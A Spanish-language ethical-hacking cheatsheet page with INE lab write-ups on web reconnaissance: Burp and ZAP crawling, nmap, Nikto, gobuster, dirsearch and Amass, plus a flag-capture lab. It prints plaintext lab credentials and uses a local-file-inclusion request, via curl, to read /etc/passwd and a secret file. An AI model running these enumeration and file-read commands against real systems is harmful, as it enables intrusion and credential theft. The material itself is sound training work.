
# Recopilación de información activa

#### Relacionado

{% content-ref url="/pages/hwjfsZ7NgjxpBmha0uRA" %}
[Recopilación Activa](/ethical-hacking-cheatsheet/recopilacion-de-informacion/recopilacion-de-informacion/recopilacion-activa.md)
{% endcontent-ref %}

### Crawling y Spidering con BurpSuite y ZAP

{% content-ref url="/pages/ssAmyHO0V9t3GsljYTTG" %}
[Crawling](/ethical-hacking-cheatsheet/recopilacion-de-informacion/crawling.md)
{% endcontent-ref %}

#### Lab

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.21       INE
127.0.0.1 AttackDefense-Kali
192.87.115.2    INE
192.87.115.2 INE
192.87.115.3 demo.ine.local
```

Nuestro objetivo es: `192.87.115.3 demo.ine.local`

Al acceder encontramos la mítica web de Mutillidae, utilizada para entrenar pentesting web:

<figure><img src="/files/YM8Z3gKTG382xBBCpO0s" alt=""><figcaption></figcaption></figure>

Activamos el FoxyProxy en el navegador y abrimos BurpSuite.&#x20;

#### Sitemap con BurpSuite

Con el proxy en Burp desactivado navegamos por la web y automáticamente se nos irá generando un sitemap en `Target > Sitemap`

<figure><img src="/files/JgfkRi1jd0Ui26hGRLjC" alt=""><figcaption></figcaption></figure>

#### OWASP ZAP

Introducimos la URL en Automated Scan y le damos al botón Attack:

<figure><img src="/files/3JQ0t1a79XHu2ndRNXLN" alt=""><figcaption></figcaption></figure>

Por ejemplo encontramos un directorio passwords que contiene un archivo `accounts.txt` que contiene usuarios y credenciales en plano:

<figure><img src="/files/dhcSmhSzHRFQescGZVOF" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Enumeración de servidores web</mark>

### Enumeración de Apache (Lab)

El servidor HTTP Apache, comúnmente conocido como Apache, es un software de servidor web gratuito y de código abierto que impulsa una parte significativa de Internet. Es reconocido por su confiabilidad, robustez y flexibilidad, lo que lo convierte en una de las opciones más populares para alojar sitios web. En este laboratorio, analizaremos los conceptos básicos del reconocimiento del servidor Apache

> ¿Qué bot tiene específicamente prohibido acceder a un directorio específico?

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.9        INE
127.0.0.1 AttackDefense-Kali
192.39.71.2     INE
192.39.71.2 INE
192.39.71.3 demo.ine.local
```

Nuestro objetivo es: `192.39.71.3 demo.ine.local`

Al acceder a `demo.ine.local` llegamos a la típica página de instalación de Apache:

<figure><img src="/files/PvjTxlFAZ38UQGIHfapC" alt=""><figcaption></figcaption></figure>

#### Escaneo de puertos

```bash
┌──(root㉿INE)-[~]
└─# nmap -v -sV demo.ine.local
```

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))                                                                                                                                                             
MAC Address: 02:42:C0:27:47:03 (Unknown) 
```

Solo encontramos el puerto 80 abierto, con la `versión 2.4.18` de Apache corriendo.

#### Escaneo de puertos dirigido

Además encontramos información adicional usando el script http-enum contra el puerto 80:

```bash
┌──(root㉿INE)-[~]
└─# nmap -v -sV -p 80 --script=http-enum demo.ine.local
```

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-enum: 
|   /robots.txt: Robots file
|   /data/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /dir/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_  /src/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
MAC Address: 02:42:C0:27:47:03 (Unknown)
```

#### Exploits públicos

```bash
┌──(root㉿INE)-[~]
└─# searchsploit Apache 2.4.18
```

<figure><img src="/files/I6yRs6wp5SQr2nUT7KPG" alt=""><figcaption></figcaption></figure>

Encontramos bastantes exploits públicos, que nos permitirían RCE en el objetivo.

#### Flag

Encontramos antes el archivo `robots.txt` que cotiene el nombre del Bot que no está permitido en la web:

<figure><img src="/files/Rt3A44M4yYvlEwutbRuE" alt=""><figcaption></figcaption></figure>

#### Enumeración de versión de Apache con Metasploit

```bash
msfconsole
use auxiliary/scanner/http/http_version
set RHOSTS 192.39.71.3
run
```

```bash
msf6 auxiliary(scanner/http/http_version) > run

[+] 192.39.71.3:80 Apache/2.4.18 (Ubuntu)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Nikto: Vulnerabilidades Web (Lab)

Las herramientas de pentesting para aplicaciones web pueden resultar muy útiles al realizar pruebas de penetración. En este ejercicio de laboratorio, veremos cómo usar Nikto para analizar aplicaciones web e identificar diversas vulnerabilidades.

En este entorno de laboratorio, se le proporcionará acceso GUI a una máquina Kali. La máquina de destino, accesible en **demo.ine.local** , aloja la aplicación web mutillidae:

{% embed url="<https://github.com/webpwnized/mutillidae>" %}

> **Objetivo:** Escanear la aplicación web con Nikto e identificar las posibles vulnerabilidades.

```bash
┌──(root㉿INE)-[~]
└─# nikto -host demo.ine.local                                                                                                                                                                                                             
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.255.89.3
+ Target Hostname:    demo.ine.local
+ Target Port:        80
+ Start Time:         2026-01-28 01:13:12 (GMT5.5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ /: Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.25.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Uncommon header 'logged-in-user' found, with contents: .
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /: Cookie showhints created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /robots.txt: contains 8 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php).
+ /phpinfo.php: Output from the phpinfo() function was found.
+ /config/: Directory indexing found.
+ /config/: Configuration information may be available remotely.
+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /data/: Directory indexing found.
+ /data/: This might be interesting.
+ /includes/: Directory indexing found.
+ /includes/: This might be interesting.
+ /passwords/: Directory indexing found.
+ /passwords/: This might be interesting.
<----SNIP---->
```

Encontramos multitud de vulnerabilidades.

#### Reporte en HTML

Podemos generar un reporte visual en HTML con el siguiente comando:

```bash
┌──(root㉿INE)-[~]
└─# nikto -h demo.ine.local -o nikto.html -Format html
```

### Fuzzing (Lab)

{% content-ref url="/pages/zIAtmEU0cp7fFcQmTGan" %}
[Fuzzing](/ethical-hacking-cheatsheet/recopilacion-de-informacion/fuzzing.md)
{% endcontent-ref %}

En este ejercicio de laboratorio, veremos cómo usar Gobuster para realizar la enumeración de directorios en la aplicación web Mutillidae.

En este entorno de laboratorio, se le proporcionará acceso GUI a una máquina Kali. La máquina de destino, accesible en **demo.ine.local** , aloja la aplicación web mutillidae \[<https://github.com/webpwnized/mutillidae>].

**Objetivo:** Realizar la enumeración de directorios con Gobuster.

#### Fuzzing básico

```bash
┌──(root㉿INE)-[~]
└─# gobuster dir -u http://demo.ine.local -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://demo.ine.local
[+] Method:                  GET                                                                                                                                                                                                           
[+] Threads:                 10                                                                                                                                                                                                            
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt                                                                                                                                       
[+] Negative Status codes:   404                                                                                                                                                                                                           
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 316] [--> http://demo.ine.local/images/]
/data                 (Status: 301) [Size: 314] [--> http://demo.ine.local/data/]
/documentation        (Status: 301) [Size: 323] [--> http://demo.ine.local/documentation/]
/ajax                 (Status: 301) [Size: 314] [--> http://demo.ine.local/ajax/]
/test                 (Status: 301) [Size: 314] [--> http://demo.ine.local/test/]
/includes             (Status: 301) [Size: 318] [--> http://demo.ine.local/includes/]
/javascript           (Status: 301) [Size: 320] [--> http://demo.ine.local/javascript/]
/classes              (Status: 301) [Size: 317] [--> http://demo.ine.local/classes/]
/config               (Status: 301) [Size: 316] [--> http://demo.ine.local/config/]
/styles               (Status: 301) [Size: 316] [--> http://demo.ine.local/styles/]
/webservices          (Status: 301) [Size: 321] [--> http://demo.ine.local/webservices/]
/LICENSE              (Status: 200) [Size: 10273]
/passwords            (Status: 301) [Size: 319] [--> http://demo.ine.local/passwords/]
/phpmyadmin           (Status: 301) [Size: 320] [--> http://demo.ine.local/phpmyadmin/]
/server-status        (Status: 403) [Size: 294]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

Encontramos multitud de directorios, que podemos complementar con otra herramienta como Dirsearch, que nos arroja resultados distintos y encontramos un repositorio de Git expuesto:

```bash
┌──(root㉿INE)-[~]
└─# dirsearch -u http://demo.ine.local                                                                                                                                                                                                     

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                                                                                                           
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                    
                                                                                                                                                                                                                                           
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/http_demo.ine.local/_26-02-01_17-09-49.txt

Target: http://demo.ine.local/

[17:09:49] Starting:                                                                                                                                                                                                                       
[17:09:51] 301 -  314B  - /.git  ->  http://demo.ine.local/.git/            
[17:09:51] 200 -  272B  - /.git/config                                      
[17:09:51] 200 -   73B  - /.git/description
[17:09:51] 200 -   23B  - /.git/HEAD                                        
[17:09:51] 200 -  596B  - /.git/
[17:09:51] 200 -  594B  - /.git/hooks/                                      
[17:09:51] 200 -  400B  - /.git/index                                       
[17:09:51] 200 -  457B  - /.git/info/                                       
[17:09:51] 200 -  240B  - /.git/info/exclude
[17:09:51] 200 -  191B  - /.git/logs/HEAD
[17:09:51] 200 -  479B  - /.git/logs/
[17:09:51] 301 -  324B  - /.git/logs/refs  ->  http://demo.ine.local/.git/logs/refs/
[17:09:51] 301 -  330B  - /.git/logs/refs/heads  ->  http://demo.ine.local/.git/logs/refs/heads/
[17:09:51] 200 -  191B  - /.git/logs/refs/heads/master
[17:09:51] 301 -  332B  - /.git/logs/refs/remotes  ->  http://demo.ine.local/.git/logs/refs/remotes/
[17:09:51] 301 -  339B  - /.git/logs/refs/remotes/origin  ->  http://demo.ine.local/.git/logs/refs/remotes/origin/
[17:09:51] 200 -  191B  - /.git/logs/refs/remotes/origin/HEAD
<----SNIP---->
```

#### Filtrar por tipo de archivo

Podemos usar la flag `-b` para filtrar resultados con status negativo (403,404...) y la flag `-x` para filtrar por distintos tipos de archivos, y la flag `-r` para hacer una búsqueda recursiva:

```bash
┌──(root㉿INE)-[~]
└─# gobuster dir -u http://demo.ine.local/data -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 403,404,500 -x .php,.txt,.xml -r                                                   
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://demo.ine.local/data
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   403,404,500
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,xml
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/accounts.xml         (Status: 200) [Size: 3679]
```

En este caso encontramos el archivo `accounts.xml`, que al leerlo nos da credenciales en plano para distintos usuarios:

```bash
┌──(root㉿INE)-[~]
└─# curl http://demo.ine.local/data/accounts.xml                                                                                                                                                                                           
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xml>
<Employees>
        <Employee ID="1">
                <UserName>admin</UserName>
                <Password>adminpass</Password>
                <Signature>g0t r00t?</Signature>
                <Type>Admin</Type>
        </Employee>
        <Employee ID="2">
                <UserName>adrian</UserName>
                <Password>somepassword</Password>
                <Signature>Zombie Films Rock!</Signature>
                <Type>Admin</Type>
        </Employee>
        <Employee ID="3">
                <UserName>john</UserName>
                <Password>monkey</Password>
                <Signature>I like the smell of confunk</Signature>
                <Type>Admin</Type>
        </Employee>
        <Employee ID="4">
                <UserName>jeremy</UserName>
                <Password>password</Password>
                <Signature>d1373 1337 speak</Signature>
                <Type>Admin</Type>
        </Employee>
        <Employee ID="5">
                <UserName>bryce</UserName>
                <Password>password</Password>
                <Signature>I Love SANS</Signature>
                <Type>Admin</Type>
        </Employee>
        <---SNIP--->
```

### Amass - Reconocimiento automatizado

{% embed url="<https://github.com/owasp-amass/amass>" %}

**OWASP Amass** es una **herramienta avanzada de reconocimiento y enumeración de activos**, usada en **ciberseguridad y pentesting** para **descubrir dominios, subdominios, IPs y relaciones de infraestructura**.

Dicho simple: **sirve para mapear toda la superficie de ataque de una organización**.

Amass es un proyecto oficial de **OWASP**, enfocado en:

* **OSINT**
* **DNS**
* **Descubrimiento pasivo y activo**
* **Correlación de datos**

Es mucho más potente que herramientas básicas como `dnsrecon`.

#### Instalación y uso

```bash
sudo apt-get install amass
```

```bash
## Enumeración simple
amass enum -d example.com
amass enum -passive -d example.com
amass enum -active -d example.com

## Enumeración completa y bruteforce de subdominios
amass enum -active -d example.com -src -ip -dir /home/kali/Desktop
amass enum -active -d example.com -src -ip -brute -dir /home/kali/Desktop
```

***

## <mark style="color:purple;">Lab Final</mark>

Este laboratorio se centra en la identificación y explotación de vulnerabilidades en aplicaciones web para descubrir flags ocultas. Utilizaremos diversas técnicas de pruebas de penetración, como la enumeración de directorios, la divulgación de información y la explotación de errores de configuración, para analizar la aplicación web objetivo. Nuestro objetivo es investigar las debilidades en los diferentes componentes de la aplicación y capturar todas las flags ocultas. Mediante el reconocimiento, el escaneo de fuerza bruta y la enumeración de archivos, verificará las vulnerabilidades de seguridad críticas que podrían explotarse en un ataque real.

### Task 1

> Investigate crawling restrictions to reveal hidden clues.

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.11       INE
127.0.0.1 AttackDefense-Kali
192.178.93.2    INE
192.178.93.2 INE
192.178.93.3 target.ine.local
```

Nuestro objetivo es `target.ine.local`

<figure><img src="/files/lhbsPg24KQ7i4omnUmKL" alt=""><figcaption></figcaption></figure>

A priori parece una web meramente informativa sin ninguna acción relevante. Al acceder al archivo `robots.txt` encontramos la flag 1:

<figure><img src="/files/EWPqPft2nQ40PPvoNtQv" alt=""><figcaption></figcaption></figure>

### Task 2

> Analyze the blueprint of the site to uncover valuable navigation insights.

Al ver el archivo `sitemap.xml` encontramos la flag 2 en un comentario:

<figure><img src="/files/YVcI6UqMXkDPnqrtuRRi" alt=""><figcaption></figcaption></figure>

### Task 3

> Locate the secret.txt file using a website vulnerability.

```bash
┌──(root㉿INE)-[~]
└─# nikto -host target.ine.local                                                                                                                            
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.178.93.3
+ Target Hostname:    target.ine.local
+ Target Port:        80
+ Start Time:         2026-02-04 15:52:40 (GMT5.5)
---------------------------------------------------------------------------
+ Server: gunicorn
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /robots.txt: Uncommon header 'content-disposition' found, with contents: inline; filename=robots.txt.
+ /robots.txt: Entry '/view_file?file=vulnerabilities.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/view_file?file=threatVector.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/view_file?file=malwareAttacks.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: Entry '/view_file?file=applicationAttacks.txt' is returned a non-forbidden or redirect HTTP code (200). See: https://portswigger.net/kb/issues/00600600_robots-txt-file
+ /robots.txt: contains 5 entries which should be manually viewed. See: https://developer.mozilla.org/en-US/docs/Glossary/Robots.txt
+ OPTIONS: Allowed HTTP Methods: HEAD, GET, OPTIONS .
+ /sitemap.xml: This gives a nice listing of the site content.
+ /nul.cfm: ColdFusion 5.0 and below, 4.0-5.0 reveal file system paths of .cfm or .dbm files when the request contains invalid DOS devices. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0576. KPMG-2002013. http://www.securityfocus.com/bid/4542. http://www.macromedia.com/v1/handlers/index.cfm?ID=22906. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0576
+ /nul.dbm: ColdFusion 5.0 and below, 4.0-5.0 reveal file system paths of .cfm or .dbm files when the request contains invalid DOS devices. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0576. KPMG-2002013. http://www.securityfocus.com/bid/4542. http://www.macromedia.com/v1/handlers/index.cfm?ID=22906. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0576
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8051 requests: 0 error(s) and 13 item(s) reported on remote host
+ End Time:           2026-02-04 15:52:51 (GMT5.5) (11 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

En **robots.txt** aparece este endpoint:

```
/view_file?file=nombre.txt
```

Eso suele ser un **Local File Inclusion (LFI)** o, como mínimo, una **lectura arbitraria de archivos** sin validación adecuada del parámetro `file`.

Manipularemos entonces el nombre del archivo para acceder a secrets.txt:

```
/view_file?file=secret.txt
```

<figure><img src="/files/USkvpJ3XallyJom4amLr" alt=""><figcaption></figcaption></figure>

### Task 4

> Perform a brute-force scan to identify hidden directories.

#### Fuzzing

```bash
┌──(root㉿INE)-[~]
└─# dirsearch -u target.ine.local

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/reports/_target.ine.local/_26-02-04_15-43-05.txt

Target: http://target.ine.local/

[15:43:05] Starting:                                                                                                                                        
[15:43:52] 200 -  329B  - /robots.txt                                       
[15:43:55] 200 -    1KB - /sitemap.xml                                      
[15:43:56] 200 -  132B  - /special                                          
                                                                             
Task Completed 
```

Encontramos el directorio `/special` que contiene la flag 4:

<figure><img src="/files/BLlyaRRnW7dEsOsvFRc4" alt=""><figcaption></figcaption></figure>

### Task 5

> Locate system files that may expose sensitive user information.

Usaremos el LFI que hemos localizado antes para leer el archivo `/etc/passwd` y leer la flag 5:

```bash
┌──(root㉿INE)-[~]
└─# curl http://target.ine.local/view_file?file=/etc/passwd
<----SNIP---->
<main>
        <pre>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
#FLAG5_01c6e33de1144dc992435b**********
</pre>
    </main>
```
